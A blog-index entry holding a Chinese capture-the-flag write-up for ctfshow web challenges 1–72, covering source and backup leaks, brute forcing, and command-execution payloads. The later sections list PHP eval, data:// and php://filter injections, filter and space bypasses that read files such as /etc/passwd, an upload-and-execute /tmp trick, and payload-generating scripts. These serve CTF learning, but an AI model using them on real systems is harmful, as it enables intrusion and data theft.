<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ctfshow刷题记录</title>
    <url>/2024/03/06/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>一些关于做ctfshow写下来的wp</p>
<span id="more"></span>

<h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开发注释未及时删除</span><br></pre></td></tr></table></figure>

<p>特别简单的，没什么好说的，F12就有flag了。</p>
<h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">js前台拦截 === 无效操作</span><br></pre></td></tr></table></figure>

<p>从别的地方进到F12就行了</p>
<h1 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">没思路的时候抓个包看看，可能会有意外收获</span><br></pre></td></tr></table></figure>

<p>抓包就行</p>
<h1 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">总有人把后台地址写入robots，帮黑阔大佬们引路。</span><br></pre></td></tr></table></figure>

<h1 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phps源码泄露有时候能帮上忙</span><br></pre></td></tr></table></figure>

<h1 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解压源码到当前目录，测试正常，收工</span><br></pre></td></tr></table></figure>

<p><a href="http://www.zip/">www.zip</a></p>
<h1 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">版本控制很重要，但不要部署到生产环境更重要。</span><br></pre></td></tr></table></figure>

<p>.git泄露</p>
<h1 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">版本控制很重要，但不要部署到生产环境更重要。</span><br></pre></td></tr></table></figure>

<p>.svn泄露</p>
<h1 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</span><br></pre></td></tr></table></figure>

<p>index.php.swp</p>
<h1 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cookie 只是一块饼干，不能存放任何隐私数据</span><br></pre></td></tr></table></figure>

<h1 id="Web11"><a href="#Web11" class="headerlink" title="Web11"></a>Web11</h1><p>域名txt记录</p>
<h1 id="Web12"><a href="#Web12" class="headerlink" title="Web12"></a>Web12</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有时候网站上的公开信息，就是管理员常用密码</span><br></pre></td></tr></table></figure>

<p>简单的账号密码</p>
<h1 id="Web13"><a href="#Web13" class="headerlink" title="Web13"></a>Web13</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</span><br></pre></td></tr></table></figure>

<p>隐藏的可点击</p>
<h1 id="Web14"><a href="#Web14" class="headerlink" title="Web14"></a>Web14</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</span><br></pre></td></tr></table></figure>

<p>找到文件位置</p>
<h1 id="Web15"><a href="#Web15" class="headerlink" title="Web15"></a>Web15</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">公开的信息比如邮箱，可能造成信息泄露，产生严重后果</span><br></pre></td></tr></table></figure>

<p>社工找qq所在地</p>
<h1 id="Web16"><a href="#Web16" class="headerlink" title="Web16"></a>Web16</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</span><br></pre></td></tr></table></figure>

<p>php探针，用于自己搭建服务器时候的探测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag</span><br></pre></td></tr></table></figure>

<h1 id="Web17"><a href="#Web17" class="headerlink" title="Web17"></a>Web17</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">备份的sql文件会泄露敏感信息</span><br></pre></td></tr></table></figure>

<p>扫目录找数据库文件即可</p>
<h1 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不要着急，休息，休息一会儿，玩101分给你flag</span><br></pre></td></tr></table></figure>

<p>JS文件源代码查看</p>
<h1 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密钥什么的，就不要放在前端了</span><br></pre></td></tr></table></figure>

<p>直接F12看源码</p>
<h1 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</span><br></pre></td></tr></table></figure>

<p>扫目录找数据库文件</p>
<h1 id="Web21"><a href="#Web21" class="headerlink" title="Web21"></a>Web21</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆破什么的，都是基操</span><br></pre></td></tr></table></figure>

<p>就正常的爆破，需要注意的是这个</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-01-24/d6decdac4d2f159a3afe68e3d12ab18b--fcc0--image-20240124141403573.png" alt="image-20240124141403573"></p>
<h1 id="Web22"><a href="#Web22" class="headerlink" title="Web22"></a>Web22</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域名也可以爆破的，试试爆破这个ctf.show的子域名</span><br></pre></td></tr></table></figure>

<p> 子域名爆破即可</p>
<h1 id="Web23"><a href="#Web23" class="headerlink" title="Web23"></a>Web23</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">还爆破？这么多代码，告辞！</span><br></pre></td></tr></table></figure>

<p>简单的php中的md5爆破</p>
<h1 id="Web24"><a href="#Web24" class="headerlink" title="Web24"></a>Web24</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆个🔨</span><br></pre></td></tr></table></figure>

<p>随机数爆破，种子都给了，直接自己本地运行一下即可</p>
<h1 id="Web25"><a href="#Web25" class="headerlink" title="Web25"></a>Web25</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆个🔨，不爆了</span><br></pre></td></tr></table></figure>

<p>偏难，使用php_mt_seed去破解得到seed从而得到flag最后。</p>
<h1 id="Web26"><a href="#Web26" class="headerlink" title="Web26"></a>Web26</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个可以爆</span><br></pre></td></tr></table></figure>

<p>暴力破解，不过全空这题也能有flag</p>
<h1 id="Web27"><a href="#Web27" class="headerlink" title="Web27"></a>Web27</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTFshow菜鸡学院招生啦！</span><br></pre></td></tr></table></figure>

<p>直接身份证日期爆破</p>
<h1 id="Web28"><a href="#Web28" class="headerlink" title="Web28"></a>Web28</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大海捞针</span><br></pre></td></tr></table></figure>

<p>直接爆破即可</p>
<h1 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令执行，需要严格的过滤</span><br></pre></td></tr></table></figure>

<p>直接*，或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo `nl fl&#x27;&#x27;ag.php`;</span><br></pre></td></tr></table></figure>

<h1 id="Web30"><a href="#Web30" class="headerlink" title="Web30"></a>Web30</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令执行，需要严格的过滤</span><br></pre></td></tr></table></figure>

<p>用上面的echo还是可以的或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_POST[0]);</span><br></pre></td></tr></table></figure>

<h1 id="Web31"><a href="#Web31" class="headerlink" title="Web31"></a>Web31</h1><p>还是可以使用post或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo`tac%09fl*`;</span><br></pre></td></tr></table></figure>

<h1 id="Web32"><a href="#Web32" class="headerlink" title="Web32"></a>Web32</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$nice=include$_GET[&quot;url&quot;]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(&quot;echo 1;&quot;); </span><br><span class="line">eval(&quot;echo 1?&gt;&quot;);</span><br><span class="line">分号可以由?&gt;代替</span><br></pre></td></tr></table></figure>

<h1 id="Web33"><a href="#Web33" class="headerlink" title="Web33"></a>Web33</h1><p>把上题的url参数换成一个数字就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$nice=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="Web34"><a href="#Web34" class="headerlink" title="Web34"></a>Web34</h1><p>同上即可</p>
<h1 id="Web35"><a href="#Web35" class="headerlink" title="Web35"></a>Web35</h1><p>同上即可</p>
<h1 id="Web36"><a href="#Web36" class="headerlink" title="Web36"></a>Web36</h1><p>同上即可，0改成a就行</p>
<h1 id="Web37"><a href="#Web37" class="headerlink" title="Web37"></a>Web37</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;)?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>

<h1 id="Web38"><a href="#Web38" class="headerlink" title="Web38"></a>Web38</h1><p>base64编码即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>

<h1 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;)?&gt;</span><br></pre></td></tr></table></figure>

<p>已经将php语句闭合了，后面加.php没有任何用</p>
<h1 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</span><br><span class="line">pos()：返回数组中的当前元素的值。</span><br><span class="line">array_reverse()：数组逆序 </span><br><span class="line">scandir()：获取目录下的文件</span><br><span class="line">next()：函数将内部指针指向数组中的下一个元素，并输出。 首先通过</span><br><span class="line">pos(localeconv())得到点号，因为scandir(’.’)表示得到当前目录下的文件，所以scandir(pos(localeconv()))就能得到flag.php了。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>直接就获得到了flag，无参数命令执行。</p>
<h1 id="Web41"><a href="#Web41" class="headerlink" title="Web41"></a>Web41</h1><p>这题就比较复杂了，我们需要去找到能够通过或操作获得相应的字符</p>
<p>php版：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>

<p>py版：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">preg = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (re.<span class="keyword">match</span>(preg,<span class="built_in">chr</span>(i),re.I) <span class="keyword">or</span> re.<span class="keyword">match</span>(preg,<span class="built_in">chr</span>(j),re.I)):</span><br><span class="line">            k = i | j</span><br><span class="line">            <span class="keyword">if</span> k&gt;=<span class="number">32</span> <span class="keyword">and</span> k&lt;=<span class="number">126</span>:</span><br><span class="line">                a = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                b = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                content += (<span class="built_in">chr</span>(k) + <span class="string">&#x27; &#x27;</span>+ a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;rce_or.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(content)</span><br></pre></td></tr></table></figure>

<p>然后手动或者python自动去拼接都行</p>
<h1 id="Web42"><a href="#Web42" class="headerlink" title="Web42"></a>Web42</h1><p>无回显</p>
<p>直接管道符或者换行绕过</p>
<p>要让命令回显，可以进行命令分隔，以此来绕过：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">;     分号</span><br><span class="line">|     只执行后面那条命令</span><br><span class="line">||    只执行前面那条命令</span><br><span class="line">&amp;     两条命令都会执行</span><br><span class="line">&amp;&amp;    两条命令都会执行</span><br><span class="line">%0a  换行</span><br></pre></td></tr></table></figure>

<p>在命令后面加上即可</p>
<h1 id="Web43"><a href="#Web43" class="headerlink" title="Web43"></a>Web43</h1><p>很简单，过滤了cat用tac就行nl也行</p>
<h1 id="Web44"><a href="#Web44" class="headerlink" title="Web44"></a>Web44</h1><p>过滤了flag，很简单的*绕过就行了</p>
<h1 id="Web45"><a href="#Web45" class="headerlink" title="Web45"></a>Web45</h1><p>过滤了空格，用${IFS}就行</p>
<p>linux适用空格绕过：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;、&lt;&gt;、%20（space）、%09（tab）、$IFS<span class="variable">$9</span>、<span class="variable">$&#123;IFS&#125;</span>、<span class="variable">$IFS</span>、&#123;<span class="built_in">cat</span>,/etc/passwd&#125;、%0a（回车）</span><br></pre></td></tr></table></figure>

<h1 id="Web46"><a href="#Web46" class="headerlink" title="Web46"></a>Web46</h1><p>过滤了*</p>
<p>法一，符号绕过。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=<span class="built_in">tac</span>%09fl<span class="string">&#x27;&#x27;</span>ag.php||</span><br></pre></td></tr></table></figure>

<p>法二，通配符 “ ? ”。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=<span class="built_in">tac</span>%09fl?g.php||</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure>

<h1 id="Web47"><a href="#Web47" class="headerlink" title="Web47"></a>Web47</h1><p>过滤了一堆没用的，和上题一样写就行</p>
<h1 id="Web48"><a href="#Web48" class="headerlink" title="Web48"></a>Web48</h1><p>还是过滤了一堆没用的</p>
<h1 id="Web49"><a href="#Web49" class="headerlink" title="Web49"></a>Web49</h1><p>还是和之前的一样</p>
<h1 id="Web50"><a href="#Web50" class="headerlink" title="Web50"></a>Web50</h1><p>过滤了%09换别的就行，还是一样的</p>
<h1 id="Web51"><a href="#Web51" class="headerlink" title="Web51"></a>Web51</h1><p>还是一样的</p>
<h1 id="Web52"><a href="#Web52" class="headerlink" title="Web52"></a>Web52</h1><p>过滤了大于小于还是差不多的，用${IFS}就行</p>
<p>还有就是注意的是flag没有php后缀了</p>
<h1 id="Web53"><a href="#Web53" class="headerlink" title="Web53"></a>Web53</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;fla&#x27;&#x27;g.php</span><br></pre></td></tr></table></figure>

<p>这样就可以了</p>
<h1 id="Web54"><a href="#Web54" class="headerlink" title="Web54"></a>Web54</h1><p>没有过滤？，可以使用这个绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=/bin/?at$&#123;IFS&#125;f???.php</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=vi$&#123;IFS&#125;f???.php</span><br></pre></td></tr></table></figure>

<h1 id="Web55"><a href="#Web55" class="headerlink" title="Web55"></a>Web55</h1><p>又是一个比较离谱的题目</p>
<p>有三种方法去写</p>
<p>第一种就是用base64去读源文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/base64 flag.php</span><br><span class="line">/???/????64 ????.???</span><br></pre></td></tr></table></figure>

<p>第二种就是对文件进行压缩从而去下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/bzip2 flag,php</span><br><span class="line">/???/???/????2 ????.???</span><br></pre></td></tr></table></figure>

<p>第三种就是最难的了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--构造一个post上传文件的数据包，这是个上传页面，选择文件上传--&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://dc1bfe3e-910b-4ad5-9130-db7f0cd7cca4.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>构造一个post去传文件，会传到临时目录中，再用.去执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 burp 拦截中，通过 GET 方式传递：</span><br><span class="line">?c=.+/???/????????[@-[]</span><br><span class="line"></span><br><span class="line">phpKKKK</span><br><span class="line"></span><br><span class="line">并在上传文件内容添加sh命令：</span><br><span class="line">#!/bin/sh</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>

<h1 id="Web56"><a href="#Web56" class="headerlink" title="Web56"></a>Web56</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux 系统下 php 接收上传文件的 post 包，默认会将文件保存在临时文件夹 /tmp/，文件名 phpXXXXXX。</span><br><span class="line">Linux 中 .（点）命令，或者叫 period，它的作用和 source 命令一样，就是用当前的 shell 执行一个文件中的命令。</span><br><span class="line">ascii 码表中，大写字母位于 “ @ ” 与 “ [ ” 之间。</span><br></pre></td></tr></table></figure>

<p>使用上题的第三种方法即可</p>
<h1 id="Web57"><a href="#Web57" class="headerlink" title="Web57"></a>Web57</h1><p>过滤了.，所以无法使用上面用到的方法</p>
<p>我们只需要凑出一个36即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$()和 ` `  </span><br><span class="line">在 bash shell 中，$( ) 与` ` (反引号) 都可用做命令替换用。</span><br><span class="line"></span><br><span class="line">例如   </span><br><span class="line"></span><br><span class="line">version=$(uname -r)和version=`uname -r`都可以是version得到内核的版本号</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux Shell 中 $(()) 的用法。  https://blog.csdn.net/u013402321/article/details/80333272</span><br><span class="line"></span><br><span class="line">简单来说，$(()) 用来做数学运算。且 $(()) 的值为 0。</span><br><span class="line"></span><br><span class="line">~ 在 $(()) 中代表按位取反，即 $((~$(()))) 就是 0 取反，即 -1。</span><br><span class="line"></span><br><span class="line">$(($((~$(())))$((~$(()))))) 也就是 $((-1-1)) 为 -2。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;_&#125; =&quot;&quot; //返回上一次命令</span><br><span class="line">$(($&#123;_&#125;))=0</span><br><span class="line">$((~$(($&#123;_&#125;))))=-1</span><br></pre></td></tr></table></figure>

<h1 id="Web58"><a href="#Web58" class="headerlink" title="Web58"></a>Web58</h1><p>system被禁掉了，所以换用别的</p>
<p>解法1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">或</span><br><span class="line">c=highlight_file(&quot;flag.php&quot;);</span><br><span class="line">或</span><br><span class="line">c=file_get_contents(&#x27;falg.php&#x27;);</span><br></pre></td></tr></table></figure>

<p>解法2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br></pre></td></tr></table></figure>

<h1 id="Web59"><a href="#Web59" class="headerlink" title="Web59"></a>Web59</h1><p>和上面一题是一样的</p>
<h1 id="Web60"><a href="#Web60" class="headerlink" title="Web60"></a>Web60</h1><p>还是和上面的一样的</p>
<h1 id="Web61"><a href="#Web61" class="headerlink" title="Web61"></a>Web61</h1><p>还是一样的</p>
<h1 id="Web62"><a href="#Web62" class="headerlink" title="Web62"></a>Web62</h1><p>还是一样的</p>
<h1 id="Web63"><a href="#Web63" class="headerlink" title="Web63"></a>Web63</h1><p>还是一样的</p>
<h1 id="Web64"><a href="#Web64" class="headerlink" title="Web64"></a>Web64</h1><p>还是一样的</p>
<h1 id="Web65"><a href="#Web65" class="headerlink" title="Web65"></a>Web65</h1><p>还是一样的</p>
<h1 id="Web66"><a href="#Web66" class="headerlink" title="Web66"></a>Web66</h1><p>这题就是新的了，将上面的函数都禁了。</p>
<p>而且通过highlight_file得知文件名改变了，我们就先用print_r(scandir(‘&#x2F;‘));查看根目录文件，再用highlight去读取即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scandir()：扫描目录</span><br></pre></td></tr></table></figure>

<h1 id="Web67"><a href="#Web67" class="headerlink" title="Web67"></a>Web67</h1><p>和上题一样的</p>
<p>题目就不贴了。和前几题一模一样的。</p>
<p>区别在于，<code>print_r()</code> 函数被禁了。</p>
<p>那就用 <code>var_dump()</code> 函数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c=var_dump(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure>

<h1 id="Web68"><a href="#Web68" class="headerlink" title="Web68"></a>Web68</h1><p>直接文件包含即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&#x27;flag.txt&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include()：表达式包含并运行指定文件。</span><br></pre></td></tr></table></figure>

<h1 id="Web69"><a href="#Web69" class="headerlink" title="Web69"></a>Web69</h1><p>这题var_dump被禁了，我们就使用var_export</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_export：输出或返回变量的可解析字符串表示。</span><br></pre></td></tr></table></figure>

<h1 id="Web70"><a href="#Web70" class="headerlink" title="Web70"></a>Web70</h1><p>和上题一模一样的</p>
<h1 id="Web71"><a href="#Web71" class="headerlink" title="Web71"></a>Web71</h1><p>这题给了源码就可以发现把所有的输出都换成了问号，但是，由于是命令执行，我们就可以加一个exit(0);在后边，从而跳过后边的替换。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);exit(0);</span><br></pre></td></tr></table></figure>

<h1 id="Web72"><a href="#Web72" class="headerlink" title="Web72"></a>Web72</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">也就是说，本题设置了 open_basedir()，将php所能打开的文件限制在指定的[目录树](https://so.csdn.net/so/search?q=目录树&amp;spm=1001.2101.3001.7020)中，包括文件本身。</span><br><span class="line">因为 ini_set() 也被限制了，所以 open_basedir() 不能用 ini_set() 重新设置绕过。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不能访问/，访问路径被限制了，只能允许访问的是/var/www/html/。</span><br><span class="line">也就是说，本题设置了open_basedir，将php所能打开的文件限制在指定的目录树中,包括文件本身。因为ini_set()也被限制了，所以open_basedir不能用ini_set重新设置绕过。</span><br></pre></td></tr></table></figure>

